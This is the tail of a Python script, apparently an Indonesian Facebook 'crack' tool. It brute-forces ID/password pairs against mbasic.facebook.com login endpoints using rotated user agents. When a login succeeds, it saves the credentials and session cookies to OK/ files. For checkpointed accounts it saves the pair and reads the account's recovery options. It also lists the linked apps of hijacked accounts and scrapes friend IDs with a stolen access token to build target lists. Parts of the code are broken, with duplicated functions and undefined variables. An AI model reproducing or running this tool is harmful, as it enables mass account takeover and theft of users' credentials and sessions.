AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1; EML-L29 Build/HUAWEIEML-L29; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1; CLT-L29 Build/HUAWEICLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36'])			
			session.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":asu,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = session.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":asu,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			po = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if 'checkpoint' in session.cookies.get_dict():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print(f"\r{K} {idf} • {pw}")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif 'c_user' in session.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print(f"\r{I} {idf} • {pw} • {U}{kuki}")
#				loger()
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/proses_crackkks/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	for i in range(len(game)):
		print(f"\r{P}[{K}{i+1}{P}]{U}-------------->{I}{game[i]} ".replace("Ditambahkan pada"," Ditambahkan pada"))
	w=session.get("https://mbasic.facebook.com/proses_crackkks/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	for i in range(len(game)):
		print(f"\r{P}[{B}{I+1}{P}]{U}-------------->{K}{game[i]} ".replace("Kedaluwarsa"," Kedaluwarsa"))

# OPSI CEKER
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s••> %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s••> %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
						cek_apk(coki)
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s••> %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s••> %s|%s|%s ----> OK       %s'%(h,id,pw,coki,x))
				cek_apk(coki)
			else:
				print('\r%s••> %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
	

def cek________apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/proses_crackkks/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
#	print(f"\r{B} |_____
	print(f"\r{B}      |_____{P}INROFMASI GAME :{B}           ")
#	print("\r╰── INFORMASI GAME :           ") 
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
#			print(f"\r{B}      |_____{P}INROFMASI GAME :{B}           ")
			print(f"\r{B}            |______ %s%s. %s%s"%(U,i+1,I,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/proses_crackkks/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
#			print(f"\r{B}            |______ %s%s. %s%s"%(I,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
			print(f"\r{B}                   |_______%s%s. %s%s"%(U,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print(f"\r{B}|_____{M}COOIKE MODAR")
#		print ("\r      %s• token invalid"%(M))



def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print(f"\r{P}-------> {B}{idf}•{pw}")
		open('dapet/CP'+durasi+'.txt','a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print(f"\r{P}-------> {I}Tap yes / kunci a2f")
			cek_apk(coki)
		else:
			for opsii in opsi:
				print(f"\r{P}-------> {B}{opsii.text}")
	except Exception as c:
		print(f"\r{P}-------> {B}{idf}•{pw}")
		print(f"\r{P}-------> {M}Login eror chek password / ip spam")
		open('dapet/CP'+durasi+'.txt','a').write(idf+'|'+pw+'\n')
		cp+=1

# OPSI CEKER
def cek_opsi():
	c = len(akun)
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Terdapat {I}{c} {P}akun untuk di chekopsi silahkan mode pesawat 2 detik")
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print(f"\r{P}-------> {M}Eror : {x}")
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s<---> %s/%s <---> [ %s ]%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print(f"\r{P}-------> {B}{id}••{pw}")
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F '%(hh,x))
						cek_apk(coki)
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s--------> %s•• %s%s'%(b,id,pw,x))
					print('\r%--------> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%--------> %s•%s•%s      %s'%(h,id,pw,coki,x))
				cek_apk(coki)
			else:
				print('\r%s---------> %s•%s ---->        %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			exit()
	exit()
	

def ce______k_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/proses_crackkks/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	print("\r╰── INFORMASI GAME :           ") 
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print("\r       ╰── %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/proses_crackkks/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print("\r       ╰── %s%s. %s%s"%(P,i+1,K,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• token invalid"%(M))

# OPSI
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s••> %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
			cek_apk(coki)
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s••> %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

# OPSI CEKER
def cek_opsi():
	c = len(akun)
	print(f"{P}-----> Terdapat {B}{c}{P} accounts untuk di cek")
	print(' ')
	input(x+'['+h+'•'+x+'] Enter')
	print(' ')
	print('PROSES CEK OPSI DIMULAI')
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s%s --------> Error      %s'%(b,kes,x))
				print('\r%s-------> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([U,I,K,b,M])
			print('\r%s-----> %s/%s ------> { %s }%s'%(U,love,len(akun),id,P), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
#					print('\r%s%s • %s -> CP       %s'%(b,id,pw,x))
					print(f"\r{K} {id} • {pw}")
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print(f"\r{P}---------->{I} Accounts tap yes ya anjink")
					else:
						for opsii in opsi:
							print('\r%s-----------> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s%s • %s--------- -> CP %s'%(b,id,pw,x))
					print('\r%s-----------> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s%s • %s ---------> OK %s'%(h,id,pw,x))
			else:
				print('\r%s%s • %s ---------> SALAH %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI')
			exit()
	print(' ')
	print('DONE')
	exit()

def cek_a______pk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/proses_crackkks/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
#			print(f"\r{I}{i+1}... {}{game[i].replace("Ditambahkan pada","Dirambahkan pada")}")
			print (f"\r{B}|__%s%s. %s%s"%(P,i+1,I,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print(f"\r{M}[•] COOKIE MODAR")
	w=session.get("https://mbasic.facebook.com/proses_crackkks/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print (f"\r{B}|__%s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print (f"\r COOKIE MODAR")


def ambilid():
	it = input("[?] ID Public : ");time.sleep(0.04)
	try:
		toket = open("token.txt","r").read()
		otw = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,toket))
		a = json.loads(otw.text)
		print('[•] nama : %s' % a['name'])
	except KeyError:
		print("[❌] Id Tidak Ada")
		ambilid()
	except IOError:
		print("[❌] Id Tidak Ada")
		ambilid()
	tampung=[]
	teman=[]
	lim = input("[•] Jumlah ID : ")
	ada = requests.get(f'https://graph.facebook.com/{it}?fields=name,friends.fields(id,name).limit{lim}&access_token={toket}').json()
	for x in ada['friends']['data']:
		tampung.append(x['id'])
	for id in tampung:
		try:
			ada2 = requests.get(f'https://graph.facebook.com/{it}?fields=name,friends.fields(id,name)&access_token={toket}').json()
			try:
				for b in idi2['friends']['data']:
					teman.append(b['id'])
			except KeyError:
				print("[•] Private")
			print("[•]", id,"•",len(teman))
			teman.clear()
		except KeyError:
			print("[•] Akun Terkena Spam")
			exit()

if __name__=='__main__':
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	os.system('git pull')
	os
	login()
#	grup()
#	nama()


